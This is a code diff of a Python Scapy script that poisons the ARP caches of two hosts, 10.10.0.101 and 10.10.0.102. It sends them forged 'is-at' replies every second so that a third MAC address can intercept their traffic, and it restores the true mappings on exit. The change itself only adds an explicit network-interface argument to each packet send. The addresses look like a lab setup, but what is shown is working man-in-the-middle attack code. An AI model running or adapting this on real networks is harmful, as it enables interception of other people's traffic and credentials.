@@ -43,10 +43,12 @@ def main() -> None:
         while True:
             sendp(Ether(dst='00:00:00:00:00:01')/ARP(
                 op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
-                psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'), verbose=False)
+                psrc='10.10.0.102', hwsrc='00:00:00:00:00:03'),
+                verbose=False, iface=IFACE)
             sendp(Ether(dst='00:00:00:00:00:02')/ARP(
                 op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
-                psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'), verbose=False)
+                psrc='10.10.0.101', hwsrc='00:00:00:00:00:03'),
+                verbose=False, iface=IFACE)
             time.sleep(1)  # don't flood the network
     except KeyboardInterrupt:
         print('\n[>] Got keyboard interrupt')
@@ -56,10 +58,12 @@ def main() -> None:
     print('[>] Cleaning up')
     sendp(Ether(dst='00:00:00:00:00:01')/ARP(
         op='is-at', pdst='10.10.0.101', hwdst='00:00:00:00:00:01',
-        psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'), verbose=False)
+        psrc='10.10.0.102', hwsrc='00:00:00:00:00:02'),
+        verbose=False, iface=IFACE)
     sendp(Ether(dst='00:00:00:00:00:02')/ARP(
         op='is-at', pdst='10.10.0.102', hwdst='00:00:00:00:00:02',
-        psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'), verbose=False)
+        psrc='10.10.0.101', hwsrc='00:00:00:00:00:01'),
+        verbose=False, iface=IFACE)
 
 
 if __name__ == '__main__':
